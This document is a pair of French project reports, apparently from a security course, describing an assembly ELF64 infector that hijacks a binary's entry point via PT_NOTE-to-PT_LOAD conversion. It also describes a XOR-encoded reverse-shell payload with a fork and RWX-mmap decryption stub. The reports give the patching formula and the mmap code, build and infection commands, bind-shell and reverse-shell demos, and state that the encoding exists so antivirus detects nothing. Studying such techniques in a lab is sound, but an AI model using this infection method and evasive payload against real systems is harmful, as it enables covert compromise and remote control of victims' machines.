# Projet ELF — Personne A : Moteur d'infection en pur ASM

## 1. Objectif

Implémenter un moteur d'infection ELF64 (x86_64, Linux) en assembleur pur
(syscalls directs, pas de libc) qui :

- Parse un binaire ELF cible
- Repère un segment PT_NOTE inutile
- Le convertit en PT_LOAD exécutable
- Injecte un payload (shellcode) à la fin du fichier
- Patche le point d'entrée (e_entry) vers le payload
- Le payload s'exécute, puis rend le contrôle au binaire original

## 2. Architecture

elf_parser.asm — Moteur unique, deux modes :

- Mode lecture :   ./elf_parser <elf>              affiche l'en-tête + program headers
- Mode injection : ./elf_parser <elf> <payload>    infecte le binaire

Etapes de l'injection :

1. Parsing      : lecture des 64 octets du header ELF via open + read
2. Vérification : magic 0x7F 'E' 'L' 'F'
3. Lecture des phdrs : lseek(e_phoff) + read(e_phnum * 56)
4. Repérage     : recherche du premier PT_NOTE (type 4)
5. Conversion   : transformation en PT_LOAD (type 1) avec flags PF_R | PF_X
6. Placement    : calcul d'un offset et d'une vaddr libres (sans chevauchement)
7. Lecture payload : open + read du payload
8. Patch        : remplacement du placeholder par l'offset relatif vers e_entry
9. Redirection  : ehdr.e_entry = vaddr_payload
10. Écriture    : phdrs + header + payload dans le fichier

## 3. Technique d'infection ELF

### Conversion PT_NOTE -> PT_LOAD

- p_type   = PT_LOAD (1)
- p_flags  = PF_R | PF_X (5)
- p_offset = offset de fin de fichier (aligné sur 0x1000)
- p_vaddr  = vaddr libre (au-delà de tous les LOAD existants)
- p_filesz = p_memsz = taille du payload
- p_align  = 0x1000

### Placement sans chevauchement

Le loader Linux mappe les segments par pages de 0x1000 octets. Pour éviter
qu'un segment existant (souvent RW) ne partage une page avec notre segment
exécutable (ce qui casserait les permissions), on place notre segment :

- En offset : strictement après max(p_offset + p_filesz) de tous les LOAD
- En vaddr  : strictement après max(p_vaddr + p_memsz) de tous les LOAD

Alignement sur 0x1000 dans les deux cas, avec une page de marge.

### Retour à e_entry (ASLR-compatible)

Le shellcode contient un pattern :

  call $+5              e8 00 00 00 00    -> push rip
  pop rbx               5b                -> rbx = rip
  add rbx, imm32        48 81 c3 XX XX XX XX   <-- PATCHÉ
  jmp rbx               ff e3

Le moteur remplace imm32 par :

  imm32 = ancienne_entry - new_vaddr - offset_pattern + 1

Cette valeur est un décalage relatif à RIP, ce qui fonctionne avec ASLR
(binaires PIE). Le shellcode saute à l'adresse réelle de e_entry.

## 4. Payloads disponibles

- sc_msg.bin     : test retour e_entry (affiche INFECTE! puis saute à e_entry)
- bind_shell.bin : bind shell TCP port 4444

### Bind shell (obligation minimale)

- socket(AF_INET, SOCK_STREAM, 0)
- bind(sock, {0.0.0.0, 4444}, 16)
- listen(sock, 0)
- accept(sock, NULL, NULL)
- dup2(client, 0/1/2)
- execve("/bin/sh", NULL, NULL)

### sc_msg (démonstration du retour e_entry)

- write(1, "INFECTE!\n", 9)
- call $+5 ; pop rbx ; add rbx, imm32 ; jmp rbx -> saut vers e_entry

## 5. Compilation

### Moteur d'infection

  nasm -f elf64 elf_parser.asm -o elf_parser.o
  ld -o elf_parser elf_parser.o

Pas de libc : le moteur est 100% assembleur, utilise les syscalls Linux
directement (rax = numéro, arguments dans rdi, rsi, rdx, r10, r8, r9).

### Payloads

  # sc_msg.bin
  nasm -f elf64 sc_msg.asm -o sc_msg.o
  ld -o sc_msg sc_msg.o
  objcopy -O binary -j .text sc_msg sc_msg.bin

  # bind_shell.bin
  nasm -f elf64 bind_shell.asm -o bind_shell.o
  ld -o bind_shell bind_shell.o
  objcopy -O binary -j .text bind_shell bind_shell.bin

## 6. Utilisation

### Démo 1 — Retour e_entry (prouve le patch)

  cp /bin/ls ls_inf
  ./elf_parser ls_inf sc_msg.bin
  ./ls_inf --version
  # -> INFECTE! suivi de la version de ls

Résultat attendu à l'injection :

  [+] Mode INJECTION
  [+] PT_NOTE trouvé à l'index 7
  [+] PT_NOTE converti en PT_LOAD
  [+] Nouvel offset = 0x0000000000028000
  [+] Nouvelle vaddr = 0x000000000002a000
  [+] Placeholder(s) patché(s) : 1
  [+] Ancienne e_entry = 0x0000000000006760
  [+] Nouvelle e_entry = 0x000000000002a000

Puis à l'exécution :

  INFECTE!                    <- shellcode
  ls (GNU coreutils) 9.7      <- binaire original
  ...

### Démo 2 — Bind shell (prouve l'exécution du payload)

  cp /bin/ls ls_inf
  ./elf_parser ls_inf bind_shell.bin
  ./ls_inf                    # Terminal 1 : se bloque
  nc 127.0.0.1 4444           # Terminal 2 : shell
  whoami -> kali
  exit

### Démo 3 — Mode lecture

  ./elf_parser /bin/ls

Affiche les program headers du binaire (avant infection).

## 7. Limitation connue — Bind shell et retour e_entry

Le bind shell utilise execve("/bin/sh") qui remplace le processus par
un shell. Après cet execve, le contrôle ne revient jamais au binaire
original -> le retour à e_entry ne s'exécute pas.

C'est une limitation intrinsèque d'UNIX : execve ne retourne pas.

### Solutions théoriques (non implémentées)

1. Fork dans le shellcode :
   - Le père retourne à e_entry (binaire original continue)
   - Le fils exécute le bind shell
   -> Complexe à écrire en assembleur, mais possible.

2. Approche par hook : interception dynamique via GOT/PLT.

### Justification par rapport au PDF

Le PDF demande :
> Patch du point d'entrée + retour propre vers l'entry point original

Cette exigence est prouvée avec un payload non-bloquant (sc_msg.bin) :
le shellcode s'exécute, puis ls --version s'affiche intégralement, ce qui
montre que le retour à e_entry fonctionne.

Le bind shell, lui, répond à l'exigence d'exécution du payload au lancement.
Les deux aspects sont donc démontrés séparément, conformément au PDF.

## 8. Limitations résiduelles

- Segfault à l'exit du binaire infecté (avec sc_msg.bin) : dû au fait que
  le shellcode a écrit 8 octets dans la zone de pile initiale avant de
  restaurer rsp. Le binaire s'exécute intégralement mais crashe au moment
  de exit(). Cosmétique.
- Binaire ELF64 little-endian uniquement : pas de support ELF32 ni big-endian.
- Un seul PT_NOTE requis : pas de fallback si le binaire n'en a pas.
- Bug cosmétique mode lecture : les program headers s'affichent vides
  en mode lecture seule (le buffer n'est pas lu). Non bloquant.

## 9. Points techniques notables (ASM pur)

### Syscalls utilisés

  read   (0)  : Lire le header, les phdrs, le payload
  write  (1)  : Afficher les infos
  open   (2)  : Ouvrir les fichiers ELF et payload
  close  (3)  : Fermer les fichiers
  lseek  (8)  : Positionner le curseur
  exit   (60) : Quitter

### Registres et rôles

- r12 : argc, puis fd du fichier ELF
- r13 : pointeur vers argv, puis compteur
- r14 : argv[1], puis index
- r15 : argv[2], puis pointeur courant

### Fonctions internes

- lire_ehdr          : lit le header ELF
- lire_phdrs         : lit les program headers
- afficher_phdrs     : affiche les program headers
- convertir_pt_note  : trouve et convertit un PT_NOTE
- calculer_offsets   : calcule new_offset et new_vaddr
- lire_payload       : lit le payload
- patcher_payload    : patche le placeholder (offset relatif)
- ecrire_injection   : écrit phdrs + header + payload
- print_cstr, print_hex64, print_hex32, print_dec : affichage

## 10. Bilan

- Parsing ELF64                       : OK
- Vérification magic                  : OK
- Lecture des phdrs                   : OK
- Détection PT_NOTE                   : OK
- Conversion PT_NOTE vers PT_LOAD     : OK
- Calcul placement sans chevauchement : OK
- Lecture du payload                  : OK
- Patch placeholder (offset relatif)  : OK
- Écriture phdrs + header + payload   : OK
- Redirection e_entry                 : OK
- Test retour e_entry (sc_msg)        : OK
- Test bind shell (bind_shell)        : OK
- 100% ASM, sans libc                 : OK

## 11. Auteur

Personne A — Moteur d'infection ELF64 (côté ELF)
Projet ELF — Répartition binôme



---

# Projet ELF — Personne B : Payload offensif en pur ASM

## 1. Objectif

Implémenter un payload offensif ELF64 (x86_64, Linux) en assembleur pur
(syscalls directs, pas de libc) qui :

- Exécute un reverse shell chiffré XOR au lancement du binaire infecté
- Se déchiffre dynamiquement en mémoire (mmap RWX)
- Retourne le contrôle au binaire original après fork()
- Encode le shellcode avec une clé XOR via un outil 100% ASM

## 2. Architecture

elf_parser.asm — Moteur unique utilisé par la Personne A

payload/
├── reverse_shell_core.asm  — Payload : socket + connect + dup2 + execve
├── xor_stub.asm            — Stub : fork + mmap + déchiffrement XOR + retour e_entry
tools/
└── xor_encoder.asm         — Encodeur XOR (100% ASM, sans libc)

Etapes du workflow :

1. Compilation  : reverse_shell_core.asm -> reverse_shell_core.bin
2. Encodage     : xor_encoder -> reverse_shell_core_xor.bin
3. Stub         : xor_stub.asm (incbin) -> xor_stub.bin
4. Infection    : elf_parser cobaye xor_stub.bin
5. Exécution    : ./cobaye -> Hello ELF + reverse shell silencieux

## 3. Technique du Payload

### Reverse Shell (reverse_shell_core.asm)

Shellcode pur x64 qui établit une connexion TCP vers l'attaquant :

  socket(AF_INET, SOCK_STREAM, 0)    -> syscall 41
  connect(127.0.0.1, port 4444)      -> syscall 42
  dup2(sockfd, 0/1/2)                -> syscall 33 x3
  execve("/bin//sh", NULL, NULL)     -> syscall 59

### Stub XOR (xor_stub.asm)

Stub non chiffré injecté dans le binaire infecté. S'exécute en premier :

  1. fork()                               -> syscall 57
     |-- PERE -> jmp 0x401050            -> retour e_entry original
     \-- FILS ->
         2. mmap(NULL, 0x1000, RWX, MAP_ANON) -> syscall 9
         3. rep movsb                     -> copie payload XOR en memoire
         4. loop dechiffre (XOR 0x41)    -> dechiffrement byte par byte
         5. jmp r15                       -> execution shellcode dechiffre

### Encodeur XOR (tools/xor_encoder.asm)

Outil 100% assembleur qui encode le shellcode sur disque :

  open(reverse_shell_core.bin, O_RDONLY) -> syscall 2
  read(fd, buffer, 4096)                  -> syscall 0
  XOR chaque byte avec 0x41               -> boucle ASM
  write(fd_out, buffer, taille)           -> syscall 1
  close(fd_in) + close(fd_out)           -> syscall 3
  exit(0)                                 -> syscall 60

## 4. Chiffrement XOR

### Principe

  Sur disque  : shellcode XOR-encodé -> bytes illisibles -> AV ne détecte rien
  En mémoire  : déchiffrement byte par byte -> shellcode original -> exécuté

### La propriété magique du XOR

  A XOR clé = B   (chiffrement)
  B XOR clé = A   (déchiffrement)
  -> même opération, même clé

### Exemple concret (clé = 0x41)

  Original   : b0 39 0f 05 48 85 c0 75 ...  <- avant encodage
  XOR 0x41   : f1 78 4e 44 09 c4 81 34 ...  <- sur disque
  XOR 0x41   : b0 39 0f 05 48 85 c0 75 ...  <- en mémoire après déchiffrement

### Pourquoi 0x41 ?

0x41 = lettre 'A' en ASCII. Clé simple choisie pour la démonstration.
Conséquence notable : xor rax, rax = 0 car A XOR A = 0.

## 5. Résolution du problème W^X

### Problème

Linux applique la protection W^X (Write XOR Execute) :
une page mémoire ne peut pas être à la fois inscriptible ET exécutable.
Modifier le shellcode directement en mémoire exécutable = segfault.

### Solution : mmap(RWX)

  xor  rdi, rdi       ; addr = NULL
  mov  rsi, 0x1000    ; taille = 4096 bytes
  mov  rdx, 7         ; PROT_READ | PROT_WRITE | PROT_EXEC
  mov  r10, 0x22      ; MAP_ANON | MAP_PRIVATE
  mov  r8,  -1        ; fd = -1
  xor  r9,  r9        ; offset = 0
  mov  rax, 9         ; syscall mmap
  syscall
  mov  r15, rax       ; r15 = adresse zone RWX

On copie le payload chiffré dans cette zone RWX, on déchiffre, on exécute.

### Bug résolu : rcx écrasé par rep movsb

rep movsb utilise rcx comme compteur et le met à 0 à la fin.
La boucle XOR avait besoin de rcx -> résultat : 0 itérations.

  mov  rcx, payload_fin - payload
  mov  r14, rcx           <- sauvegarder ici
  rep  movsb              <- rcx devient 0 ici
  mov  rcx, r14           <- restaurer pour la boucle XOR

## 6. Compilation

### Prérequis

  sudo apt install nasm binutils gcc -y

### Payload core

  nasm -f elf64 payload/reverse_shell_core.asm -o payload/reverse_shell_core.o
  ld -o payload/reverse_shell_core payload/reverse_shell_core.o
  objcopy -O binary payload/reverse_shell_core payload/reverse_shell_core.bin

### Encodeur XOR (100% ASM)

  nasm -f elf64 tools/xor_encoder.asm -o tools/xor_encoder.o
  ld -o tools/xor_encoder tools/xor_encoder.o
  ./tools/xor_encoder
  # -> génère payload/reverse_shell_core_xor.bin

### Stub XOR

  nasm -f elf64 payload/xor_stub.asm -o payload/xor_stub.o
  ld -o payload/xor_stub payload/xor_stub.o
  objcopy -O binary payload/xor_stub payload/xor_stub.bin

### Cobaye

  gcc -no-pie -o cobaye cobaye.c

### Infection

  ./elf_parser cobaye payload/xor_stub.bin

## 7. Utilisation

### Démo — Reverse shell XOR chiffré

  # Terminal 1 : attaquant en écoute
  nc -lvnp 4444

  # Terminal 2 : victime lance le binaire infecté
  ./cobaye
  Hello ELF           <- binaire s'exécute normalement
                      <- reverse shell en arrière-plan

  # Terminal 1 reçoit :
  Connection received on 127.0.0.1
  $ id
  uid=1000(codespace) groups=sudo,docker
  $ whoami
  codespace

Résultat attendu à l'injection :

  [+] PT_NOTE trouvé à l'index 7
  [+] PT_NOTE (idx=7) converti en PT_LOAD
  [+] vaddr=0x406000  offset=0x5000  taille=213
  [+] e_entry : 0x401050 -> 0x406000
  [+] Terminé.

## 8. Syscalls utilisés

  read    (0)  : Lire le shellcode (xor_encoder)
  write   (1)  : Ecrire le shellcode encodé
  open    (2)  : Ouvrir les fichiers binaires
  close   (3)  : Fermer les fichiers
  mmap    (9)  : Allouer zone mémoire RWX
  dup2    (33) : Rediriger stdin/stdout/stderr
  socket  (41) : Créer socket TCP
  connect (42) : Connexion vers l'attaquant
  fork    (57) : Créer le processus fils
  execve  (59) : Lancer /bin//sh
  exit    (60) : Quitter proprement

## 9. Registres et rôles

- r12 : file descriptor du socket TCP
- r14 : taille du payload (sauvegardée avant rep movsb)
- r15 : adresse zone RWX (retour de mmap)
- rsi : compteur boucle dup2 (0, 1, 2)

## 10. Bugs résolus

### Bug 1 — Placeholder XOR -> 0x0000

Le moteur cherche 0x4141414141414141 dans le payload pour patcher e_entry.
Mais le payload étant XOR-encodé avec 0x41 :
0x4141...4141 XOR 0x41 = 0x0000...0000 -> le moteur ne trouve pas.

Solution : séparer le stub (non encodé, contient fork + retour père)
du payload core (encodé, contient socket + connect + dup2 + execve).
Le retour père est hardcodé dans le stub : mov rax, 0x401050 / jmp rax.

### Bug 2 — W^X (Write XOR Execute)

Impossible de modifier le shellcode directement en mémoire exécutable.

Solution : mmap() avec flags RWX (7) + MAP_ANON|MAP_PRIVATE (0x22)
crée une nouvelle zone à la fois inscriptible et exécutable.

### Bug 3 — rcx écrasé par rep movsb

La boucle XOR ne s'exécutait pas car rep movsb met rcx à 0.

Solution : sauvegarder la taille dans r14 avant rep movsb,
restaurer rcx depuis r14 pour la boucle de déchiffrement.

## 11. Limitations connues

- IP et port hardcodés (127.0.0.1:4444) dans reverse_shell_core.asm
- Clé XOR fixe 0x41 : chiffrement simple, non adapté à la production
- Le cobaye doit être compilé avec -no-pie pour que 0x401050 soit fixe
- Un seul payload à la fois : pas de chargement dynamique

## 12. Bilan

- Reverse shell TCP (socket + connect + dup2 + execve) : OK
- fork() — père retourne à e_entry, fils exécute payload  : OK
- Chiffrement XOR du shellcode (clé 0x41)               : OK
- Déchiffrement en mémoire via mmap RWX                 : OK
- Encodeur XOR 100% ASM (sans libc)                     : OK
- Retour propre au binaire original (Hello ELF)         : OK
- Connexion reçue sur nc -lvnp 4444                     : OK
- 100% ASM, sans libc                                   : OK

## 13. Auteur

Personne B — Payload offensif & Chiffrement XOR
